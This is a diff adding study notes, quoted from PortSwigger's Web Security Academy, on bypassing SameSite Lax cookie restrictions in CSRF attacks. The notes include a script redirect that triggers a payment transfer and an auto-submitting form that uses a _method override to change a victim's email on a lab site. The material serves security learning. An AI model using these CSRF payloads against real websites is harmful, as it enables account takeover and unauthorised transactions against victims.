@@ -301,6 +301,65 @@ POC
     </body>
 </html>
 ```
+**Bypassing samsite lax restriction**
+
+
+Chrome applies Lax samesite restriction by default
+
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+
+
+If you encounter a cookie set with SameSite=None or with no explicit restrictions, it's worth investigating whether it's of any use. 
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set. 
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+Simpliest approach for samsite restriction bypass 
+```
+<script> document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000'; </script>
+```
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+
+Skeleton script
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+Exploit
+
+```
+<html>
+    <body>
+    <script> history.pushState(' ',' ', '/')</script>
+    <form action="https://0a8400150459db7c814e7548006d00f5.web-security-academy.net/my-account/change-email" method="GET">
+        <input type="hidden" name="_method" value="POST"/>
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
+
+Explanation
+
+
+If they also use Lax restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a GET request from the victim's browser. 
+Even if an ordinary GET request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the _method parameter in forms, which takes precedence over the normal method for routing purposes: 
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
+
+
+
+From <https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions> 
 
 
 
